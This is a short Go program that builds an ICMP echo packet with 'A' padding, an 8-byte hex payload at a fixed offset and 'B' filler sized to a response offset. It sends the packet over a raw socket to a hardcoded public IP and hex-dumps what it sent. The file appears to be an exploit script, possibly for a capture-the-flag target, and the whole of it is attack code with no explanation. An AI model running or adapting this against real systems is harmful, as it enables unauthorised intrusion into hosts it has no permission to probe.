package main

import (
	"bytes"
	"encoding/hex"
	"fmt"
	"log"
	"math/rand"
	"net"

	"golang.org/x/net/icmp"
	"golang.org/x/net/ipv4"
)

func main() {
	targetIP := "34.159.43.116"

	payload, _ := hex.DecodeString("dd48d0cfd3103cd4")
	payloadOffset := 0x1c
	responseOffset := 0x3c
	responseSize := 0x27

	padding := bytes.Repeat([]byte("A"), payloadOffset-len(payload))
	data := append(padding, payload...)
	responseFill := bytes.Repeat([]byte("B"), (responseOffset - (payloadOffset + len(payload)) + responseSize))
	data = append(data, responseFill...)

	// Make a new ICMP message
	m := icmp.Message{
		Type: ipv4.ICMPTypeEcho, Code: 0,
		Body: &icmp.Echo{
			ID: rand.Int(), Seq: rand.Int(),
			Data: data,
		},
	}
	packet, err := m.Marshal(nil)
	if err != nil {
		panic(err)
	}

	conn, err := net.Dial("ip4:icmp", targetIP)
	if err != nil {
		log.Fatalf("Dial: %s\n", err)
	}

	n, err := conn.Write(packet)
	if err != nil {
		panic(err)
	}
	fmt.Printf("write %d bytes\n", n)
	fmt.Println(hex.Dump(packet))
}
